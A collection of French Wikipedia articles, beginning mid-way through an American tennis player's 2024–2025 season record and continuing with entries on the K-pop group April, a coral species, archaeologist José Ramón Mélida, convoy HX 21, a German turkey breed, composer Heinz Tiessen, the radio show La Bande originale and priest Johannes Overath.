Il part disputer le tournoi de Tokyo à la fin du mois de septembre mais tombe en tant que tête de série numéro une d'entrée contre le jeune Français Arthur Fils (4-6, 6-3, 3-6). Il montre néanmoins de bonnes dispositions à Shanghaï où il franchit le troisième tour pour la première fois en cinq participations après des victoires sur les qualifiés Térence Atmane en deux jeux décisifs et Yosuke Watanuki (6-3, 6-4) qui jouent pour la première fois le tournoi. Il écrase en huitièmes le Danois Holger Rune (6-1, 6-2) et profite d'un tableau ouvert pour se glisser en demi-finale, sa quatrième en Masters 1000, victorieux sur le vétéran Belge David Goffin (6-3, 6-4). Pour son dixième match en carrière contre Novak Djokovic, il essuie une dixième défaite (4-6, 6-7), laissant le Serbe disputer une nouvelle finale de Masters 1000. Il hérite d'un tirage compliqué à Paris-Bercy avec le Britannique Jack Draper, demi-finaliste à l'US Open et victorieux à Vienne la semaine passée et au bout d'un match disputé, s'incline (6-7, 6-4, 4-6). Malgré ce résultat, il se qualifie au Masters de fin d'année pour la deuxième fois de sa carrière.
2025. 2 titres à Stuttgart et Eastbourne, demi-finale à Miami, Toronto et Wimbledon.
Il débute l'année par deux victoires expéditives à l'Open d'Australie contre son compatriote revenant sur le circuit Jenson Brooksby (6-2, 6-0, 6-3) et sur le qualifié Chilien Cristian Garín (6-2, 6-1, 6-0) auquel il ne laisse que trois petits jeux. Il est néanmoins surpris au troisième tour par le vétéran Français Gaël Monfils âgé de 38 ans qui le sort en trois manches (6-3, 5-7, 6-7, 4-6), l'empêchant pour la première fois depuis un an et demi de rejoindre la deuxième semaine d'un Majeur.
Il bat un autre Français, Arthur Rinderknech (6-4, 6-2) au tournoi de Dallas en tant que tête de série numéro une, mais subit la loi du Canadien Denis Shapovalov (6-2, 3-6, 6-7) qui bat son premier Top 10 depuis plus de deux ans. Double tenant du titre à Delray Beach, il confirme son début de saison maussade en étant sorti en deux tie-breaks en quarts contre l'Espagnol Alejandro Davidovich Fokina après avoir éliminé le Chinois Wu Yibing (7-6, 6-2). Il s'arrête dès les huitièmes de finale, comme l'année passée, écartant le qualifié Matteo Gigante (6-3, 7-5) et remontant un handicap de un set à zéro contre le Chilien à court de forme Alejandro Tabilo (4-6, 6-3, 6-1). Il perd de nouveau contre le Britannique Jack Draper, demi-finaliste du dernier US Open (5-7, 4-6). Se montrant solide à Miami, il ne perd pas un seul set contre l'Italien Lorenzo Sonego, quart de finaliste à l'Open d'Australie (7-6, 6-3), le Canadien Denis Shapovalov, titré à Dallas (7-5, 6-3) et contre l'Australien repêché Adam Walton (6-3, 7-5). Face à un grand Matteo Berrettini, il sort vainqueur de son quart de finale (7-5, 6-7, 7-5), ralliant le dernier carré pour la première fois en Floride. Il joue à ce stade le jeune novice Tchèque Jakub Menšík, et s'incline au bout d'un nouveau duel acharné (6-7, 6-4, 6-7), laissant son adversaire remporter sa plus belle victoire en carrière jusqu'alors et lui permettant de jouer sa première finale en Masters 1000.
Il revient sur le circuit à Madrid où il défend sa demi-finale de l'année passée. Après un match tranquille contre Christopher O'Connell (6-4, 6-1) qu'il avait déjà battu il y a deux ans ici-même, il souffre contre Benjamin Bonzi mais profite de l'abandon du Français qui se blesse en fin de seconde manche (4-6, 7-5 ab.). Il rencontre en huitièmes le terrien Casper Ruud, double finaliste de Roland-Garros qui le sort (5-7, 4-6) et remportera son premier Masters 1000 quelques jours plus tard ici-même. Il est battu dès son entrée en lice en deux jeux décisifs à Rome par son compatriote Marcos Giron qui bat son premier Top 10 sur terre -battue en carrière à cette occasion. Tête de série numéro une à Genève, il écarte le Français Quentin Halys (6-4, 7-6) mais est éliminé par l'ancien Top 10 Hubert Hurkacz, récent quart de finaliste à Rome (3-6, 6-7) en quarts du tournoi suisse. Il termine sa tournée sur terre par une défaite d'entrée à Roland-Garros, la première en Majeur depuis près de trois saisons contre l'Allemand Daniel Altmaier (5-7, 6-3, 3-6, 1-6), la plus belle victoire de ce dernier en termes de classement.
L'Américain rebondit d'une belle manière sur gazon en enlevant son neuvième titre en carrière sans perdre un seul set à Stuttgart. Il se débarrasse du Français Quentin Halys (6-3, 7-6), du qualifié Hongrois Márton Fucsovics (6-3, 6-4), du Canadien Félix Auger-Aliassime, ancien Top 10 (6-4, 7-6) mais surtout du numéro trois mondial Alexander Zverev qui dispute sa première finale sur gazon depuis huit ans (6-3, 7-6). Il enchaîne avec le Queen's mais sort prématurément contre le Français Corentin Moutet, qui obtient sa plus belle victoire en terme de classement, après avoir obtenu une balle de match (7-6, 6-7, 5-7). Il se ressaisit à Eastbourne, où il livre de gros combats, contre le jeune João Fonseca qui joue sa première saison pleine sur le circuit (6-3, 6-7, 7-5), puis contre son compatriote Marcos Giron (7-5, 4-6, 7-5) et en demi-finale face à l'Espagnol Alejandro Davidovich Fokina (6-3, 3-6, 6-1). Il remporte son quatrième titre en autant de finales ici contre la surprise repêchée Jenson Brooksby de retour de suspension cette saison (7-5, 6-1). Il dispute la semaine suivante le tournoi de Wimbledon et hérite de deux grands serveurs, Giovanni Mpetshi Perricard et Gabriel Diallo, récent vainqueur de son premier titre en carrière à Bois-Le-Duc. Il écarte le Français en étant mené deux manches à zéro (6-7, 6-7, 6-4, 7-6, 6-4) et le Canadien en cinq sets également (3-6, 6-3, 7-6, 4-6, 6-3). Il sort ensuite de nouveau Alejandro Davidovich Fokina (6-4, 6-3, 6-7, 6-1) et profite de l'abandon du spécialiste de la surface Jordan Thompson (6-1, 3-0 ab.) pour accéder comme l'année passée aux quarts de finale. Rencontrant le Russe Karen Khachanov, il passe l'obstacle (6-3, 6-4, 1-6, 7-6) et parvient en demi-finale d'un Majeur pour la seconde fois de sa carrière. Il joue à ce stade le double tenant du titre et récent vainqueur de Roland-Garros Carlos Alcaraz, qu'il accroche. Malgré des balles de sets obtenues dans la quatrième manche, il cède de nouveau contre l'Espagnol (4-6, 7-5, 3-6, 6-7) qui se qualifie pour la finale une nouvelle fois.
Favori du tournoi de Washington, il est solide contre l'Australien Aleksandar Vukic (6-3, 6-2) et l'Italien Matteo Arnaldi (6-3, 6-4) puis rencontre pour la troisième fois de la saison Alejandro Davidovich Fokina qui au terme d'un match disputé parvient à créer la surprise (6-7, 6-3, 5-7). Il enchaîne avec le tournoi de Toronto où il figure parmi les favoris en l'absence de plusieurs joueurs majeurs. Il assume son statut de tête de série numéro deux en s'imposant devant l'Espagnol Roberto Carballés Baena (7-5, 7-6) et le local Gabriel Diallo (6-4, 6-2). Il dispose très difficilement du Tchèque Jiří Lehečka en trois tie-breaks pour jouer son premier quart de finale en carriere ici puis sort le Russe Andrey Rublev (6-3, 7-6). Il est battu aux portes de la finale par son jeune compatriote Ben Shelton (4-6, 3-6) qui accède ainsi à sa première finale en Masters 1000. Il sort dès les huitièmes de finale à Cincinnati, éliminé par le surprenant qualifié Térence Atmane (6-3, 5-7, 3-6) qui n’avait remporté avant le Masters 1000 étasunien qu’un match sur le circuit ATP cette saison. Il avait auparavant solidement écarté son compatriote Emilio Nava (6-4, 6-4) ainsi que l'Italien Lorenzo Sonego (7-6, 7-5).
Il défend les points de sa finale de l'an passée à l'US Open fin août et hérite d'un tableau clément en affrontant des invités comme son compatriote Emilio Nava (7-5, 6-2, 6-3) ou des qualifiés, contre qui il lâche quelques sets, par exemple face au Sud-Africain Lloyd Harris (4-6, 7-6, 6-2, 6-4) et contre le Suisse Jérôme Kym (7-6, 6-7, 6-4, 6-4) qui joue son premier Grand Chelem en carrière. Il joue en huitièmes le Tchèque Tomáš Macháč et s'en sort avec brio (6-4, 6-3, 6-3) mais voit sa bête noire, la légende Novak Djokovic qu'il n'a jamais battu en dix confrontations s'opposer à lui en quarts. Il subit une nouvelle défaite face au vétéran Serbe (3-6, 5-7, 6-3, 4-6) à ce stade, qui bat le record de Chris Evert de nombre de demi-finales de Majeurs disputées en carrière.
Ancien vainqueur, il retrouve la finale à Tokyo au terme d'un chemin difficile, proche de l'élimination contre le Canadien Gabriel Diallo (4-6, 6-3, 7-6), prenant le meilleur sur le Portugais Nuno Borges (7-5, 7-6) et ses compatriotes Sebastian Korda (6-3, 6-7, 6-3) et Jenson Brooksby (6-4, 6-3). Il joue le numéro un mondial, Carlos Alcaraz, récent vainqueur de son sixième Grand Chelem à l'US Open qui triomphe facilement de l'Américain (4-6, 4-6). Il perd les points de sa demi-finale à Shanghai en octobre, après avoir difficilement écarté le Hongrois Fábián Marozsán (2-6, 7-6, 7-6), subissant le service du jeune Giovanni Mpetshi Perricard qui triomphe de son premier Top 10 en carrière (4-6, 5-7).
Il joue le tournoi de Bâle en octobre et hérite du récent vainqueur surprise Valentin Vacherot au premier tour. Difficilement, l'Américain parvient à battre le Monégasque (4-6, 7-6, 7-5) mais subit les foudres du gaucher Ugo Humbert, qui sort son premier Top 10 de l'année au tour suivant (3-6, 4-6). Vainqueur d'Aleksandar Vukic à Nanterre (7-6, 6-2), il est qualifié pour le Masters de fin de saison et s'incline dès le match suivant contre Alexander Bublik sur le même score, titré à quatre reprises cette saison là.
Parcours dans les Masters 1000.
! width="50"|Année
! width="125"|Indian Wells
! width="125"|Miami
! width="125"|Monte-Carlo
! width="125"|Madrid
! width="125"|Rome
! width="125"|Canada
! width="125"|Cincinnati
! width="125"|Shanghai
! width="125"|Paris
Parcours en Coupe Davis.
Son bilan en Coupe Davis est le suivant :
Confrontations avec ses principaux adversaires.
Confrontations lors des différents tournois ATP et en Coupe Davis avec ses principaux adversaires ("6 confrontations minimum et avoir été membre du top 10"). Classement par pourcentage de victoires. Situation au :
Ce bilan ne prend pas en compte les confrontations en qualifications, en Challenger, Futures, ou durant le parcours junior des joueurs :
Victoires sur le top 10.
Toutes ses victoires sur des joueurs classés dans le top 10 de l'ATP lors de la rencontre.

</doc>
<doc id="9413565" url="https://fr.wikipedia.org/wiki?curid=9413565" title="April (groupe)">
April (groupe)

April (hangeul : , stylisé APRIL) est un ' sud-coréen de K-pop, originaire de Séoul, actif entre 2015 et 2022. Durant son existence, le groupe comprend six membres : Chaekyung, Chaewon, Naeun, Yena, Rachel et Jinsol. Elles débutent le , avec l'EP ' et le titre principal "".
Somin quitte le groupe, le suivi par Hyunjoo, le &lt;ref name="www.soompi.com/2016/10/29"&gt;&lt;/ref&gt;. Finalement, le groupe se sépare en .
Nom.
Le nom du groupe provient de la phrase « "Girl you can't help but love" », parce que le « A » représente le meilleur et « Pril » signifie une fille adorable.
Histoire.
Origines (2012–2014).
Entre 2012 et 2014, Somin et Chaekyung sont membres du groupe japonais du label DSP Media, Puretty sortant les singles ' en 2012, "Shwa Shwa Baby" en 2013, avant d’être dissous en 2014 avec des plans pour les membres de re-débuter dans d'autres groupes. À la mi-2014, Somin, Chaewon et Chaekyung participent au ', dans lequel sept "" concourent pour devenir les nouvelles membres de Kara. Chaekyung est éliminée, tandis que Somin et Chaewon vont en finale où elles terminent en deuxième et quatrième place.
En 2016, la nouvelle membre Chaekyung, accompagnée de Cho Shiyoon, représente DSP Media dans le "reality show" ', où elle termine à la place. Elle participe également avec d'autres concurrentes de ' pour rejoindre le groupe temporaire "", C.I.V.A en , et rejoint le groupe temporaire I.B.I de LOEN Entertainment en .
Débuts (2015).
Le , DSP Media annonce qu'ils allaient faire débuter un nouveau ' et que celui-ci serait la génération suivante de Fin.K.L et de Kara. En , DSP Media annonce les membres d'April à travers une série de teasers avec le logo du groupe. Ce dernier est créé a la suite d'un concours. Au début du mois d'août, DSP Media confirme qu'April débuterait le avec l'EP '. Le , April met en ligne le clip vidéo de ' issu de leur premier EP. Le même jour, le groupe débute à travers un ' nommé ' diffusé sur l'application V de Naver, durant lequel l'EP ' est publié. Le , April publie le clip « chorégraphie » de la chanson titre de leur premier EP, "". Plutôt que de filmer tout simplement la chorégraphie dans le contexte donné d'une salle d'entraînement, Somin, Chaewon, Hyunjoo, Naeun, Yena et Jinsol se sont vues exécuter leurs mouvements de danse au milieu du centre-ville, près de l'eau ou même en face de la célèbre statue du roi Sejong.
Le , l'agence du groupe publie un communiqué pour annoncer le départ de So Min. Le même jour, DSP Media, met en ligne sur le fancafé du groupe, une lettre manuscrite écrite par Somin. La DSP Media déclare qu'elle ne serait pas remplacée et que les April continueront leurs activités à cinq et pourraient faire un retour dans les semaines à venir. Le , DSP Média poste sur le compte Instagram officiel des April une image consistant en un test de math, annonçant ainsi la sortie du single du groupe. Le , l'agence poste des photos du tournage du MV et révèle que la chanson promue par le groupe serait appelé '. Le , un teaser vidéo de ' est posté. Le , le MV de ', ainsi que des vidéos des coulisses du tournage et une interview, sont mis en ligne sur la chaîne YouTube officielle du groupe. Le , DSP Media annonce que le ' April sortira un ' intitulé ' le , et publie des teaser sous forme de puzzles sur les Facebook, Twitter, Instagram et Café Fan du groupe.
Changement de membres (2016).
Le , DSP média poste une vidéo spéciale Version Noraebang pour ' sur la chaîne YouTube du groupe. Le , le groupe annonce qu'il tiendra son fanmeeting au Japon, le , sous le nom de ' qui sera présenté par l'ancienne membre des KARA, Heo Young-ji. Un EP meeting a également lieu le à Séoul. Le , DSP Media annonce sur le site officiel des April que le fan club du groupe sera appelé '. L'agence explique que ' est un mélange de ' (qui signifie « bon/bien ») plus "Apple", qui est une forme abrégée de « April ». Le , les April jouent un mini-concert intitulé '. Le , April remporte le « Prix du ' rookie de l'année » à la des Korean Entertainment Arts Awards, le ' utilisé pour " est également mentionné lors de la remise des prix.
Le , DSP Media annonce par le biais d'une affiche teaser que le groupe va faire son retour, le . L'affiche montre un cadre de fleurs avec des textes à l'intérieur et un dessin qui rappelle des ailes de papillon. Le , il est révélé que le groupe sortira leur deuxième mini-album ' avec le titre '. Le , Hyunjoo annonce prendre une pause en raison de problèmes respiratoires et de maux de tête fréquents. Le , il est annoncé que le groupe célébrera son premier anniversaire en tiennent leur premier concert en solo en deux actes intitulé ' le , à la salle d'art Baek Am de Séoul. Un autre concert est organisé à Tokyo, au Japon, le . Alors qu'encore une ', Chaekyung participe aux deux concerts en tant qu'invité. Le , Hyunjoo révèle une lettre manuscrite annonçant la fin de sa pause de et son départ d'April pour poursuivre une carrière d'actrice. Le même jour, la DSP Media confirme son départ du groupe et annonce qu'April serait réorganisé avec Chaewon, Naeun, Yena et Jinsol ainsi que l'ajout de nouvelles membres pour un comeback prévus pour le début de l'année 2017. Le , DSP Media annonce que l'ancien membre de Puretty, participante à ' et ' et membre des groupes temporaires I.B.I et C.I.V.A, Yoon Chaekyung est ajouté à April. Le , DSP Media présente Rachel comme dernier membre d'April et révèle que le groupe allait faire un comeback en .
', ' et " (2017).
Le , DSP Media publie une image teaser intitulée ' annonçant qu'April ferait son retour en tant que groupe de six membres, le . Le , la révélation de la liste des titres confirme que ' serait le troisième EP du groupe. L'album aura dont et ', ' et ' étant ré-enregistrés à la suite de l'ajout de Chaekyung et Rachel. Le clip vidéo pour la chanson titre, ' est mis en ligne le . Le , la vidéo de la chorégraphie d"" est publiée.
Le , April interprète "LUV" des Apink pour le de '. Le , le groupe interprète durant ', "WOW " une chanson figurant également sur l'album '. Le , le groupe interprète ' sur ' de JTBC. Il est plus tard annoncé que la chanson serait sortie en tant que sigle numérique, le . La performance live de ' est utilisée comme MV pour la chanson. À la fin du mois de , il est annoncé que les April tiendraient, leur deuxième "" japonais intitulée "[#April Japan Fanmeeting 2017～April Story～]" au Shinagawa Intercity Hall de Tokyo, le .
Le , il est rapporté qu'April avait commencé à filmer un nouveau programme de réalité pour Mnet qui devrait être diffusé en . Il est également révélé que le groupe préparait aussi un nouvel album à promouvoir avec le programme. Le , il est confirmé que le programme de réalité intitulé ' commencera sa diffusion, le pour un total de . Le , le groupe publie le MV surprise pour son single ' ('), à travers le premier épisode de leur programme de réalité '. ("").
Le , DSP Media annonce que le retour du groupe est repoussé jusqu'à ce que les membres aient fini de filmer leur programme de réalité A-IF-Ril, la sortie est fixée pour la mi-mai. April confirme néanmoins leur prochain titre ainsi que leur concept et font des préparatifs finaux. Le , le groupe lance son deuxième programme de réalité de l'année intitulé ' sur Naver TV. Le , DSP Media annonce que le retour du groupe était prévu pour le avec son deuxième single album intitulé '. Le , le MV de thème de tennis pour leur single ' (') est republié sous le titre ', en même temps que la piste de titre du single ' et son MV thème rétro, suivi d'un MV chorégraphie spéciale de « Mayday », le . Le , April interprète « Sting / Lovesick » durant M Countdown.
En , le groupe révèle, lors d'une interview accordée à "International BnT", pour se préparer déjà pour leur prochain album avec un objectif de sortie fixé pour un retour avant la fin de l'année. Le , DSP Media annonce que le retour du groupe était prévu pour septembre. Le , DSP Media annonce que le retour du groupe avait été fixé pour le avec un album intitulé '. Le , DSP Media révèle la liste des titres de album confirmant que ' est le de April mener par la chanson ' ('). Le , il est annoncé que le groupe organiserait son deuxième concert japonais intitulé " le . Le groupe a également donné un concert en coréele jour de Noel intitulé « 2017 Special Chrisytmas April Eve ».
Débuts au Japon et " (2018–2019).
Le , DSP Media annonce que le groupe se préparait pour la sortie d'un single le . Le , l'agence révèle que le single ferait partie d'un album spécial. Le , il est révélé que la prochaine sous-unité composée des membres Jinsol et Naeun publierait une chanson intitulée ' ('). Le , DSP Media confirme que le retour du groupe était prévu pour le , avec le cinquième EP du groupe, '. L'album sort avec le titre ' ('). Le , DSP Media annonce qu'April ferait ses débuts au Japon au cours du mois suivant. Le groupe fait ses débuts au Japon le avec la version japonaise de leur single '. Le single contient également la version japonaise du morceau ' ainsi que la version instrumentale des deux chansons. Le single est promu par le biais d'émissions télévisées et d’une série de fan-meetings dans différentes villes du Japon. Le , le média OSEN publie un rapport exclusif sur le retour d'April. Jinsol, la plus jeune membre du groupe, confirme ensuite confirmé ces informations. Le , DSP Media confirme que le groupe reviendrait avec son sixième EP intitulé ', qui sort le avec la chanson titre ' (').
Le , DSP Media annonce qu'April allait faire son premier retour au Japon le avec la sortie de la version japonaise de la chanson ', un calendrier de sortie des teasers sont mis en ligne le du même mois. Le single contient également la version japonaise de leur single ' de 2018, ainsi que la version instrumentale des deux chansons et la version coréenne de "".
Polémique et séparation (2021–2022).
En l’ancienne membre Lee Hyunjoo annonce qu'elle avait été victime d’intimidation de la part du groupe ; à la suite de cette polémique, le groupe cesse ses activités. Le DSP Media annonce la séparation du groupe, après une discussion avec les membres, elles ont pris la décision de se séparer afin de suivre chacune leur propre chemin.

</doc>
<doc id="9413570" url="https://fr.wikipedia.org/wiki?curid=9413570" title="Caryophyllia transversalis">
Caryophyllia transversalis

Caryophyllia transversalis est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413572" url="https://fr.wikipedia.org/wiki?curid=9413572" title="José Ramón Mélida">
José Ramón Mélida

José Ramón Mélida y Alinari, né le à Madrid et mort dans la même ville, est un archéologue et écrivain espagnol.
Biographie.
Né dans une famille de la bourgeoisie madrilène, il fait des études d'archiviste à la Escuela Superior de Diplomatica. Stagiaire bénévole au Département de préhistoire et antiquité du Musée archéologique national (1876-1881), il publie des romans archéologiques.
Devenu conservateur de département au musée (1884), il crée une salle d'antiquités ibériques puis, de 1901 à 1916, dirige le Musée des reproductions artistiques avant de revenir au Musée archéologique national comme directeur (1916-1930).
En parallèle, il occupe à partir de 1912, jusqu'en 1926, la chaire d'archéologie à l'Université centrale de Madrid. Directeur de nombreuses fouilles comme à Numance (1906-1923) ou Mérida (1910-1932), il est à l'origine de la fondation du Museo Numantino de Soria et découvre à Mérida le théâtre romain dont il établit le plan et fait commencer la reconstruction.
En 1909, il est le représentant officiel de l'Espagne au congrès international d'archéologie du Caire et, en 1929, est le Président du congrès international d'archéologie de Barcelone.
Membre de l'Academia de Bellas Artes de San Fernando (1899), il est élu en 1906 à la Real Academia de la Historia. Il est aussi membre correspondant de l'Académie des inscriptions et belles-lettres et de l'Institut archéologique allemand.

</doc>
<doc id="9413574" url="https://fr.wikipedia.org/wiki?curid=9413574" title="Convoi HX 21">
Convoi HX 21

Le convoi HX 21 est un convoi passant dans l'Atlantique nord, pendant la Seconde Guerre mondiale. Il part de Halifax au Canada le 18 février 1940 pour différents ports du Royaume-Uni et de la France. Il arrive à Liverpool le 4 mars 1940.
Composition du convoi.
Ce convoi est constitué de 16 cargos :
L'escorte.
Ce convoi est escorté en début de parcours par :
Le voyage.
Les destroyers canadiens font demi tour le 19 février. Le mars, le navire atelier quitte le convoi remplacé par les destroyers et le 2 mars.
Le convoi arrive sans problème.

</doc>
<doc id="9413577" url="https://fr.wikipedia.org/wiki?curid=9413577" title="Centre international d'études supérieures en sciences agronomiques">
Centre international d'études supérieures en sciences agronomiques



</doc>
<doc id="9413579" url="https://fr.wikipedia.org/wiki?curid=9413579" title="Dindon bronzé d'Allemagne">
Dindon bronzé d'Allemagne

Le dindon bronzé d'Allemagne (en allemand : "Bronzepute") est une race de dindon allemand.
Description.
Le bronzé d'Allemagne arbore un plumage noir à reflets bronze. Ses ancêtres proviennent d'Amérique et ont été importés en Espagne en 1533, et de là vers la France, l'Angleterre et l'Allemagne. 
C'est en se procurant un mâle d'Angleterre en 1909 présentant des reflets bronze que les éleveurs allemands vont s'efforcer de fixer ce caractère en une race stable à la chair fine. Elle est déclarée en danger en 2008 ; en effet il n'existait plus en Allemagne que 334 individus en 1997. Dix ans plus tard, l'effectif remonte à 800 individus ; le zoo d'Heidelberg en montre quelques sujets.
Le bronzé d'Allemagne diffère du bronzé d'Amérique (dont il descend) car il est plus élancé et possède des pattes plus longues, des cuisses inférieures saillantes, et surtout les plumes de la queue montrent des bandes et un liseré de couleur sable foncé à brun doré.
Le bronzé d'Allemagne est bien résistant aux intempéries et il est élevé pour la finesse de sa chair. Les mâles peuvent atteindre 12 à 15 kg, les femelles 6 à 8 kg. Elles pondent de 20 à 50 œufs par an pesant 70 grammes. Le mâle participe aussi à la couvaison. Les poussins naissent après vingt-huit jours.

</doc>
<doc id="9413582" url="https://fr.wikipedia.org/wiki?curid=9413582" title="Heinz Tiessen">
Heinz Tiessen

Heinz Richard Gustav Heinrich Tiessen (né le à Königsberg – décédé le à Berlin-Ouest) est un compositeur, chef d'orchestre et pédagogue allemand.
Biographie.
Tiessen était le fils d'un juge assesseur et a passé son enfance à Bartenstein. Il a étudié à Königsberg avec le compositeur Erwin Kroll. À la demande de son père, il a envisagé une carrière d'avocat. Il est allé à Berlin en 1905 et s'est inscrit à l'Université Humboldt. Après un semestre, il a bifurqué vers des études de philosophie et est devenu un admirateur de Georg Simmel. Il est aussi entré au Conservatoire Stern, où il a étudié la composition avec Philipp Rufer, la théorie avec Wilhelm Klatte et la direction avec Arno Kleffel.
En 1913 et 1914, les deux symphonies de Tiessen ont été créées avec succès. Il s'est consacré à partir de cette date à la musique. Richard Strauss a été l'une des personnes qui l'ont soutenu et encouragé. En 1917, Strauss lui a trouvé un travail comme un répétiteur au Staatsoper Unter den Linden. En outre, Tiessen a travaillé comme critique musical à l'« "Allgemeine Musikzeitung" » de 1911 à 1917. De 1918 à 1921, il a travaillé comme chef d'orchestre au théâtre de la Freie Volksbühne. Il a également travaillé en 1920-1922 comme chef de l'« "Akademischen Orchester-Vereinigung" » au sein de l'Université. À partir de 1921, Tiessen est devenu membre du Novembergruppe formé par des intellectuels de gauche. Plus tard, il a été membre fondateur de la section allemande de la Société internationale pour la musique contemporaine. Au sommet de sa gloire, il a été nommé professeur de composition à l'Académie de musique de Berlin en 1925.
Au moment de l'arrivée du nazisme, Tiessen a travaillé avec les chœurs des travailleurs socialistes. Tiessen a pu exercer ses activités d'enseignement après 1933 et jusqu'en 1945, mais ses œuvres ont été considérées après la prise de pouvoir d'Adolf Hitler comme indésirables et ont disparu du répertoire. Pendant ces années, le travail de composition de Tiessen s'est pratiquement interrompu. Tiessen a été censeur pour le Ministère du Reich à l'Éducation du peuple et à la Propagande.
Après la Seconde Guerre mondiale, Tiessen a dirigé de 1946 à 1949 le Conservatoire Municipal (anciennement de Stern) et en 1949-1955 a occupé le poste de professeur de composition et de théorie à l'Académie de musique de Berlin, avant de se retirer de la vie publique et de se remettre à composer. Cependant, il ne pouvait retrouver le rythme de composition de ses premières années. Ses œuvres ont cessé d'être jouées à cause de l'attitude des nazis et n'ont plus été reprises, alors que seuls quelques artistes ont continué à défendre cet auteur. Heinz Tiessen est décédé en 1971 après une longue maladie. Il était devenu un compositeur presque oublié. C'est seulement vers la fin du que s'est éveillé un nouvel intérêt pour sa musique.
Tiessen a épousé en 1944 en secondes noces la pianiste Anneliese Schier.
Parmi ses plus célèbres élèves, on trouve Eduard Erdmann, Josef Tal, Erik Bergman et Sergiu Celibidache.
Tout au long de sa vie, le compositeur a nourri une passion pour le chant des oiseaux, en particulier les merles. Il a commencé à faire une recherche systématique pour recueillir ces chants. Tiessen a résumé son expérience dans le livre paru en 1953 "Music of Nature". Déjà en 1915, il avait traité dans son Septuor op. 20, les différents appels du merle, ce qui a fait de lui à cet égard, un précurseur d'Olivier Messiaen.
Tiessen a composé deux symphonies, et de la musique de scène pour un certain nombre de pièces de théâtre, de la musique pour orchestre à cordes, une Totentanz-Suite pour petit orchestre, de la musique de chambre, des pièces pour piano et orgue, des lieder, et de la musique chorale. La musique de Richard Strauss, qui en 1917 avait aidé Tiessen à obtenir un emploi à l'Opéra d'État de Berlin, a influencé une grande partie de ses premières œuvres: la Première Symphonie est dédiée à Strauss. À partir de 1918, son langage musical s'est tourné vers une forme personnelle de l'expressionnisme, grâce auquel ses nombreuses musiques de scène ont pu évoluer vers une forme au style libre très spectaculaire.

</doc>
<doc id="9413584" url="https://fr.wikipedia.org/wiki?curid=9413584" title="La Bande originale">
La Bande originale

La Bande originale est une émission française de radio de divertissement présentée par Nagui et Leïla Kaddour-Boudadi, diffusée sur France Inter quotidiennement de à depuis août 2014.
Historique.
L'émission est créée en , prenant la suite de "On va tous y passer" d'André Manoukian, qui en avait assuré l'intérim après le départ de Frédéric Lopez. Durant la première saison, afin que Nagui ne soit pas simultanément sur France Inter et France 2, les dernières minutes de l'émission sont animées par Chris Esquerre.
En , l'émission bat un record d'audience depuis 13 ans : . En , les résultats d'audience donnent une très forte progression pour Nagui et sa "Bande originale" : avec en moyenne.
Polémiques.
Pierre-Emmanuel Barré.
Le , dans l'entre-deux-tours de l'élection présidentielle de 2017 qui oppose Emmanuel Macron à Marine Le Pen, France Inter refuse de diffuser la chronique hebdomadaire de Pierre-Emmanuel Barré, où il déclare notamment : « Vous pensiez vraiment que j'allais vous dire que j'allais voter Macron ? Eh ben non, je n'aime pas son programme, je ne vote pas pour lui, c'est tout, c'est ça, c'est la démocratie. Et non, ce n'est pas parce que je ne vote pas Macron que je soutiens le Front national ». L'animateur Nagui justifie le refus de la chaîne ainsi : « Il n'y a pas de censure sur France Inter. Mais, nous vivons des semaines qui ne sont pas tout à fait anodines. Pierre-Emmanuel Barré est écouté par les jeunes, il a un pouvoir d'influence ». L'humoriste, s'estimant au contraire victime de censure, démissionne de France Inter.
Florence Mendez.
En novembre 2022, la chroniqueuse Florence Mendez déclare avoir été « victime de harcèlement » de la part d'une collaboratrice de l'émission. Selon les informations du "Parisien", il semble que Leïla Kaddour-Boudadi soit la personne décrite par Florence Mendez. Florence Mendez confirmera cette information par la suite dans une interview donnée au magazine "Moustique".

</doc>
<doc id="9413585" url="https://fr.wikipedia.org/wiki?curid=9413585" title="Institut des sciences du télescope spatial">
Institut des sciences du télescope spatial



</doc>
<doc id="9413595" url="https://fr.wikipedia.org/wiki?curid=9413595" title="Johannes Overath">
Johannes Overath

Johannes Overath, né à Sieglar le et décédé le à Cologne, est un prêtre allemand, théologien (docteur en philisophie), musicologue grégorien, qui se distinguait surtout de ses services au sein du Saint-Siège, à partir du concile Vatican II.
Enfance et formations.
Johannes Overath naquit, le , à Sieglar, près de Troisdorf, et situé entre Cologne et Bonn. Il était enfant de Martin Overath et Anna Elisabeth Overath (avant le mariage, Kühn).
Au regard de sa formation, il fut d'abord accueilli au lycée de Siegburg. Avant de devenir prêtre, Johannes Overath approfondit ses études à l'université de Bonn, puis celle de Tübingen. Ceux qu'il étudiait étaient la philosophie, la théologie ainsi que la musicologie. Enfin, il obtint son doctorat en philosophie.
Prêtre à Cologne.
Le à la cathédrale de Cologne, Johannes Overath reçut son ordination sacerdotale.
À la suite de cette ordination, Overath servait en qualité de chanoine, à l'église Saint-Luc à Overath-Immekeppel de 1939 à 1942, puis à celle de Saint-François à Cologne-Bilderstöckchen en 1942. À partir de 1943, il se qualifiait le chanoine de Sainte-Marie sur Kupfergass à Cologne. Désormais, il était l'un des prêtres les plus importants à cette ville. Plus tard, il aurait été octroyé le chanoine d'honneur de la cathédrale de Cologne, en 1980. 
Une fois la guerre terminée, il commença, en 1946, à enseigner la liturgie et la musique sacrée auprès du séminaire à Bensberg près de Cologne.
En 1948, il devint formellement professeur du séminaire de Bensberg et Cologne, de la musique sacrée et de l'homilétique. Il ne quitterait pas cette fonction jusqu'en 1971.
En tant que musicologue grégorien, il participa à la rédaction d'une nouvelle version de l'Édition Vaticane. Ce graduel grégorien, accompagné des signes "mora" au lieu des signes rythmiques de Solesmes, fut sorti en 1953. 
Entre 1954 et 1964, il fut le responsable du mouvement cécilien en Allemagne ("Allgemeinen Cäcilienverbandes für die Länder der deutschen Sprache"). 
Dans les années 1950, en profitant de l'évolution de ses études, Overath préparait plusieurs publications. Toutefois, à la suite du concile Vatican II, celui-ci était désormais chargé de servir en faveur du Saint-Siège.
Services à Rome.
Avant que ce concile ne soit inauguré, ce prêtre de Cologne devint prélat d'honneur en 1960. Puis, Overath était d'abord peritus du concile dès 1962, et il conserva cette fonction jusqu'en 1965.
